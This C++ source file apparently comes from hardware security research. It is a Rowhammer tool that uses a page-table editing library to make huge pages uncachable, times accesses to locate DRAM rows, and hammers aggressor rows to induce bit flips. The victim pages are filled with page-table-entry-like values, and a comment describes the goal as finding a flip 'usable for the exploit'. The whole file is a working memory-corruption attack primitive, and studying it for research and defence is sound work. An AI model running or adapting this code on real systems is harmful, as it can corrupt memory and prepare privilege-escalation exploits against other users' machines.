#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../../common/ptedit_header.h"

#include <asm/unistd.h>
#include <cassert>
#include <cerrno>
#include <climits>
#include <cstdint>
#include <cstdio>
#include <ctime>
#include <fcntl.h>
#include <iostream>
#include <linux/perf_event.h>
#include <math.h>
#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_CYAN    "\x1b[36m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_RESET   "\x1b[0m"

/*
6  (Correct: 100%)
8  (Correct: 75%)
12 16  (Correct: 100%)
13 17  (Correct: 75%)
14 18  (Correct: 75%)
*/

// flush is currently not used the hammer, because I only got a really small
// amount of bit flips that way

#if defined(__x86_64__)
static void flush(volatile void *addr) {
    asm volatile("clflushopt (%0)" : : "r"(addr) : "memory");
}
static void mfence() {
    asm volatile("mfence");
}

#else
static inline void flush(volatile void *addr) {
    asm volatile("dc civac, %0\n\t" : : "r"(addr) : "memory");
}

static inline void mfence() {
    asm volatile("isb");
}
#endif

constexpr int sort_rows_shift = 15;

static int g_pagemap;

// flip counter: 43 33 0 x 9

enum Flip {
    TRIES      = 0,
    UC_TO_1    = 1,
    UC_TO_0    = 2,
    FLUSH_TO_1 = 3,
    FLUSH_TO_0 = 4,
};

static int g_flip_counter[5] = { 0 };

static uint64_t ns() {
    struct timespec tp;
    clock_gettime(CLOCK_MONOTONIC, &tp);
    return ((uint64_t)tp.tv_sec) * 1000000000ULL + tp.tv_nsec;
}

static size_t get_free_mem() {
    struct sysinfo info;

    if ( sysinfo(&info) < 0 )
        return 0;

    return info.freeram;
}

static int make_uncachable(uint8_t *mem, size_t mem_size, int level) {
    int uc_mt = ptedit_find_first_mt(PTEDIT_MT_UC);
    if ( uc_mt == -1 ) {
        std::cout << "No memory uncachable memory type attribute" << std::endl;
        exit(255);
    }

    // Mark uncacheable
    uint64_t i;
    if ( level == 0 ) {
        for ( i = 0; i < mem_size; i += 0x1000 ) {
            ptedit_entry_t entry = ptedit_resolve(mem + i, 0);
            entry.pte            = ptedit_apply_mt(entry.pte, uc_mt);
            entry.valid          = PTEDIT_VALID_MASK_PTE;
            ptedit_update(mem + i, 0, &entry);
        }
    }
    else if ( level == 1 ) {
        for ( i = 0; i < mem_size; i += 0x200000 ) {
            ptedit_entry_t entry = ptedit_resolve(mem + i, 0);
            entry.pmd            = ptedit_apply_mt(entry.pmd, uc_mt);
            entry.valid          = PTEDIT_VALID_MASK_PMD;
            ptedit_update(mem + i, 0, &entry);
        }
    }

    return 0;
}

static int make_cachable(uint8_t *mem, size_t mem_size, int level) {
    int uc_mt = ptedit_find_first_mt(PTEDIT_MT_UC);
    if ( uc_mt == -1 ) {
        std::cout << "No memory uncachable memory type attribute" << std::endl;
        exit(255);
    }

    // Mark cacheable
    uint64_t i;
    if ( level == 0 ) {
        for ( i = 0; i < mem_size; i += 0x1000 ) {
            ptedit_entry_t entry = ptedit_resolve(mem + i, 0);
            entry.pte &= ~0x1c;
            entry.pte |= 0x10;
            entry.valid = PTEDIT_VALID_MASK_PTE;
            ptedit_update(mem + i, 0, &entry);
        }
    }
    else if ( level == 1 ) {
        for ( i = 0; i < mem_size; i += 0x200000 ) {
            ptedit_entry_t entry = ptedit_resolve(mem + i, 0);
            entry.pmd &= ~0x1c;
            entry.pmd |= 0x10;
            entry.valid = PTEDIT_VALID_MASK_PMD;
            ptedit_update(mem + i, 0, &entry);
        }
    }

    return 0;
}

static uint64_t get_ppn(uintptr_t virtual_address) {
    // Read the entry in the pagemap.
    uint64_t value;
    int      got = pread(g_pagemap, &value, 8, virtual_address / 0x1000 * 8);
    if ( got != 8 ) {
        printf("didn't read 8 bytes from pagemap\n");
        exit(255);
    }
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    return page_frame_number;
}

static int open_page_map() {
    g_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if ( g_pagemap == -1 ) {
        std::cout << "opening pagemap failed " << errno << " " << strerror(errno) << ", exiting" << std::endl;
        return -1;
    }
    printf("opened pagemap\n");
    return 0;
}

static void *aligned_mmap(size_t alignment, size_t length, int prot, int flags, int fd, off_t offset) {
    void *addr;

    do {
        // get a 4k page aligned address from the kernel that fits
        // length + alignment. The address we get here is used the calculate the
        // aligned address we will use for the next mmap call
        addr = mmap(NULL, length + alignment, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if ( addr == MAP_FAILED )
            return MAP_FAILED;

        // printf("address: %p\n", addr);

        // unmap the memory
        munmap(addr, length + alignment);

        // if another thread (that does not exist at the moment) now maps memory
        // to exactly that address the mmap will fail. Because of that we run this
        // thing in a loop. #hackerman

        // align the address
        void *aligned_addr = (void *)(((uintptr_t)addr & ~(alignment - 1)) + alignment);

        // printf("aligned address: %p\n", aligned_addr);

        // mmap aligned
        addr = mmap(aligned_addr, length, prot, flags | MAP_FIXED, fd, offset);
        // addr = mmap(0, length, prot, flags, fd, offset);

        if ( addr == MAP_FAILED )
            return MAP_FAILED;

    } while ( ((uintptr_t)addr & alignment) != 0 );

    return addr;
}

static volatile uint8_t *get_aligned_uncached_hugepage_mem(size_t mem_size) {

    // get the memory
    volatile uint8_t *mem = (volatile uint8_t *)aligned_mmap(0x200000, mem_size, PROT_READ | PROT_WRITE,
                                                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if ( (void *)mem == MAP_FAILED ) {
        std::cout << "aligned_mmap failed " << errno << " " << strerror(errno) << ", exiting" << std::endl;
        return (volatile uint8_t *)-1;
    }
    printf("got memory %p\n", mem);

    // tell the kernel that we would like to have huge pages
    int ret = madvise((void *)mem, mem_size, MADV_HUGEPAGE);
    if ( ret != 0 ) {
        std::cout << "madvise failed " << errno << " " << strerror(errno) << ", exiting" << std::endl;
        return (volatile uint8_t *)-1;
    }
    printf("advised huge pages\n");

    // map the pages
    for ( size_t i = 0; i < mem_size; i += 0x200000 ) {
        mem[i] = i;
    }
    printf("mapped all pages %ld\n", get_free_mem());

    // make them uncachable
    make_uncachable((uint8_t *)mem, mem_size, 1);

    return mem;
}

static int get_row_number(uintptr_t addr) {
    // cut of bits higher than our 2mb page
    uintptr_t row  = (addr >> sort_rows_shift) & 0x3f;
    uintptr_t bit3 = (row & (1 << 3)) >> 3;
    row            = row ^ (bit3 << 2);
    row            = row ^ (bit3 << 1);
    return row;
}

static void print_addressing_bits(uintptr_t addr) {
    printf("%ld %ld %ld", ((addr >> 12) ^ (addr >> 16)) & 1, ((addr >> 13) ^ (addr >> 17)) & 1,
           ((addr >> 14) ^ (addr >> 18)) & 1);
}

static void setcpu(int cpu) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if ( sched_setaffinity(getpid(), sizeof(set), &set) == -1 ) {
        printf("sched_setaffinity failed\n");
        exit(1);
    }
}

static int find_rows(uint8_t *mem, size_t len, volatile uint8_t **rows, int start) {
    volatile uint8_t *aggr[2];
    int               found_rows = 1;
    int               rowIdx;

    aggr[0]      = mem + (start << 12);
    rowIdx       = get_row_number((uintptr_t)aggr[0]);
    rows[rowIdx] = (uint8_t *)aggr[0];

    for ( size_t i = 0; i < len; i += 0x1000 ) {
        aggr[1] = mem + i;

        uint64_t start = ns();

        for ( int j = 0; j < 250000; j++ ) {
            *(aggr[0]);
            *(aggr[1]);
            mfence();
        }

        uint64_t duration = ns() - start;

        if ( duration / 1000 > 23000 ) {

            rowIdx = get_row_number((uintptr_t)aggr[1]);

            printf("\r%lx\t%ld\t%d\t%p\t0x%lx\t", i, duration / 1000, rowIdx, aggr[1],
                   get_ppn((uintptr_t)aggr[1]) * 0x1000);
            print_addressing_bits((uintptr_t)aggr[1]);
            fflush(stdout);

            rows[rowIdx] = (uint8_t *)aggr[1];
            found_rows++;
        }
    }

    printf("\n");
    return found_rows;
}

// find bit flips in a memory area
static int find_flips(volatile uint8_t *mem, size_t mem_size, uint64_t tmp_victim_page[512], int *to0, int *to1) {

    assert(mem_size == 0x1000);

    uint64_t *meml = (uint64_t *)mem;

    int usable_flips = 0;

    for ( size_t i = 0; i < 512; ++i ) {
        if ( meml[i] != tmp_victim_page[i] ) {
            printf("\nFLIP FOUND! %lx != %lx %p\n", meml[i], tmp_victim_page[i], (void *)&meml[i]);

            uint64_t faulted = meml[i] ^ tmp_victim_page[i];

            usable_flips++;

            (*to0) += __builtin_popcountll(tmp_victim_page[i] & faulted);
            (*to1) += __builtin_popcountll(~tmp_victim_page[i] & faulted);
        }
    }

    return usable_flips;
}

// this function finds a bit flip that is usable for the exploit
// and returns the aggressor and victim addresses and the pattern with
// which the aggressors where filled
static int find_usable_flip(volatile uint8_t *mem, size_t mem_size) {
    volatile uint8_t *rows[64];
    volatile uint8_t *aggr[4];
    volatile uint8_t *victim;

    uint64_t tmp_victim_page[512];

    // try many times to find bit flips
    for ( size_t i = 0; i < mem_size / 0x200000; i++ ) {
        // take a random combination of bank, rank and channel or loop through all of them

        int64_t  offset = i * 0x200000;
        uint8_t *page   = (uint8_t *)mem + offset;

        for ( int brc = 0; brc < 8; brc++ ) {
            printf("Offset: %lx, BRC: %d\n", offset, brc);
            printf("mem: %p\n", mem);

            make_uncachable(page, 0x200000, 1);

            printf("physical address: %lx\n", get_ppn((uintptr_t)*page) * 0x1000);

            int found_rows = find_rows(page, 0x200000, rows, brc);

            if ( found_rows < 60 ) {
                printf("found only %d rows, trying next huge page\n", found_rows);
                break;
            }

            for ( int use_flush = 0; use_flush < 2; use_flush++ ) {

                if ( use_flush ) {
                    make_cachable(page, 0x200000, 1);
                }

                // hammer all rows
                for ( int row_idx = 0; row_idx < 60; row_idx++ ) {
                    aggr[0] = (volatile uint8_t *)rows[row_idx];
                    aggr[1] = (volatile uint8_t *)rows[row_idx + 4];
                    aggr[2] = (volatile uint8_t *)rows[row_idx + 1];
                    aggr[3] = (volatile uint8_t *)rows[row_idx + 3];
                    victim  = (volatile uint8_t *)rows[row_idx + 2];

                    // try patterns 0x55 and 0xaa
                    for ( int dir = 0; dir < 2; dir++ ) {

                        uint64_t a_pat = dir ? 0x5555555555555555llu : 0xaaaaaaaaaaaaaaaallu;

                        for ( auto &a : aggr )
                            std::fill_n((uint64_t *)a, 512, a_pat);

                        for ( size_t ii = 0; ii < 512; ++ii ) {
                            tmp_victim_page[ii] = 0x0068000000000fd3llu | (rand() % 140000) << 12;
                        }

                        memcpy((void *)victim, (void *)tmp_victim_page, 0x1000);

                        for ( int k = 0; k < 512; k++ ) {
                            flush(((uint64_t *)aggr[0]) + k);
                            flush(((uint64_t *)aggr[1]) + k);
                            flush(((uint64_t *)aggr[2]) + k);
                            flush(((uint64_t *)aggr[3]) + k);
                            flush(((uint64_t *)victim) + k);
                        }

                        printf("\rHammer rows %d %d, %p %p, %lx, %lx", row_idx, row_idx + 4, aggr[0], aggr[1],
                               get_ppn((uintptr_t)aggr[0]), get_ppn((uintptr_t)aggr[1]));

                        fflush(stdout);

                        uint64_t duration;

                        if ( use_flush ) {
                            uint64_t start = ns();
                            // hammer
                            for ( int loops = 0; loops < 20000000; ++loops ) {
                                *(aggr[0]);
                                *(aggr[1]);
                                mfence();
                                flush(aggr[0]);
                                flush(aggr[1]);
                            }
                            duration = ns() - start;
                        }
                        else {
                            uint64_t start = ns();
                            // hammer
                            for ( int loops = 0; loops < 20000000; ++loops ) {
                                *(aggr[0]);
                                *(aggr[1]);
                                mfence();
                            }
                            duration = ns() - start;
                        }

                        int to0 = 0, to1 = 0;

                        int usable_flips = find_flips(victim, 0x1000, tmp_victim_page, &to0, &to1);

                        if ( use_flush ) {
                            g_flip_counter[FLUSH_TO_1] += to1;
                            g_flip_counter[FLUSH_TO_0] += to0;
                        }
                        else {
                            g_flip_counter[UC_TO_1] += to1;
                            g_flip_counter[UC_TO_0] += to0;
                        }

                        printf("  took %ld us, %d flips", duration / 1000, usable_flips);

                        g_flip_counter[TRIES]++;
                        usleep(100 * 1000);
                    }

                    printf("\ntries: %d, UC flips 0->1: " COLOR_GREEN "%d" COLOR_RESET ", 1->0: " COLOR_GREEN
                           "%d" COLOR_RESET ", FLUSH flips 0->1: " COLOR_GREEN "%d" COLOR_RESET ", 1->0: " COLOR_GREEN
                           "%d" COLOR_RESET "\n",
                           g_flip_counter[TRIES], g_flip_counter[UC_TO_1], g_flip_counter[UC_TO_0],
                           g_flip_counter[FLUSH_TO_1], g_flip_counter[FLUSH_TO_0]);
                }
            }
        }
    }

    printf("\n");
    return 0;
}

static void sig_handler(int signo) {
    printf("\nreceived %d\n", signo);
    printf("flip counter: %d %d %d %d %d\n", g_flip_counter[TRIES], g_flip_counter[UC_TO_1], g_flip_counter[UC_TO_0],
           g_flip_counter[FLUSH_TO_1], g_flip_counter[FLUSH_TO_0]);
    exit(0);
}

int main(int argc, char *argv[]) {

    size_t mem_size = 0x200000UL * 1500;

    signal(SIGINT, sig_handler);
    signal(SIGKILL, sig_handler);
    signal(SIGSEGV, sig_handler);
    signal(SIGTERM, sig_handler);

    setcpu(7);

    if ( ptedit_init() ) {
        std::cout << "couldn't init ptedit" << std::endl;
        exit(255);
    }

    if ( open_page_map() == -1 )
        return errno;

    while ( 1 ) {

        volatile uint8_t *mem = (volatile uint8_t *)get_aligned_uncached_hugepage_mem(mem_size);

        if ( (void *)mem == MAP_FAILED )
            return 0;

        find_usable_flip(mem, mem_size);

        munmap((void *)mem, mem_size);

        printf("flip counter: %d %d %d %d %d\n", g_flip_counter[TRIES], g_flip_counter[UC_TO_1],
               g_flip_counter[UC_TO_0], g_flip_counter[FLUSH_TO_1], g_flip_counter[FLUSH_TO_0]);

        printf("\n");

        sleep(1);
    }

    printf("flip counter: %d %d %d %d %d\n", g_flip_counter[TRIES], g_flip_counter[UC_TO_1], g_flip_counter[UC_TO_0],
           g_flip_counter[FLUSH_TO_1], g_flip_counter[FLUSH_TO_0]);

    return 0;
}